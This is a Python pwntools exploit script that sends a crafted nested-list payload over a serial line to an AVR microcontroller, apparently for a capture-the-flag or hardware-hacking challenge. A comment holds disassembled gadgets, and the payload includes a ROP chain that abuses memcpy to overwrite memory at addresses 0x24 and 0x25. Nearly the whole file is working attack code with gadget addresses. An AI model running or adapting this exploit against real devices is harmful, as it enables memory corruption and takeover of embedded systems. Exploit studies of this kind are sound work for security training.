from pwn import *
import time

context.timeout = 1.0

#p = serialtube('/tmp/simavr-uart0',9600,convert_newlines=False)
p = serialtube('/dev/ttyACM0',9600,convert_newlines=False)


p.send(b'k\\l')
asdf = p.recvuntil('l')
print( repr(asdf))
r = p.recvuntil('> ')
assert b'> ' in r

x = [b"A"*32] * 32

# Sploit setup
x[-3] = b'C'*10            # alignment
x[-2] = b'B'*8            # alignment

# Goal : set addresses 0x24, 0x25 to "ffff"
# memcpy(r25:24, r23:22,
'''
     2de:       a7 01           movw    r20, r14
     2e0:       67 e5           ldi     r22, 0x57       ; 87
     2e2:       71 e0           ldi     r23, 0x01       ; 1
     2e4:       03 96           adiw    r24, 0x03       ; 3
     2e6:       0e 94 df 04     call    0x9be   ; 0x9be <memcpy>
     2ea:       0b c0           rjmp    .+22
     ...
     302:       ce 01           movw    r24, r28
     304:       df 91           pop     r29
     306:       cf 91           pop     r28
     308:       1f 91           pop     r17
     30a:       0f 91           pop     r16
     30c:       ff 90           pop     r15      ; <--- First entry
     30e:       ef 90           pop     r14
     310:       df 90           pop     r13
     312:       08 95           ret

     354:       ce 01           movw    r24, r28
     356:       df 91           pop     r29
     358:       cf 91           pop     r28
     35a:       08 95           ret

'''

# HACK: we can reuse the copy from the first part of the string :)

rop = b'\xff\xff' # Data to copy. Accessed from address 0x187
rop += struct.pack('>HHx', 0x30c//2, 2) # r15:14 := 2
rop += struct.pack('>HH', 0x356//2, 0x21) # r29:28 := 0x21 = 0x24 - 3
rop += struct.pack('>HH', 0x354//2,0x4141)  # r25:24 := r29:28 ; r29:28 := 0x4141
rop += struct.pack('>HHHHx',  0x2de//2,0x4141,0x4242,0x4343) # memcpy(r25:24+3, beginOfString, r15:14)
rop += struct.pack('>H',  0x1194//2)  # exit, watchdog does not approve!
x[-1] = rop
# end sploit



l = x[-1]
for e in x[:-1][::-1]:
	l = [e, l]

m = repr(l).replace("b'","'").replace("'",'"').encode()

m = m.replace(b']',b'')

# split last " for debug
#m = b'"'.join(m.split(b'"')[:-1])

#print("Sending: %r"%m)
for c in m:
	c = chr(c).encode()
	p.send(c)
	#time.sleep(1/960)
c = p.recvuntil(b'> ')
print (repr(c))
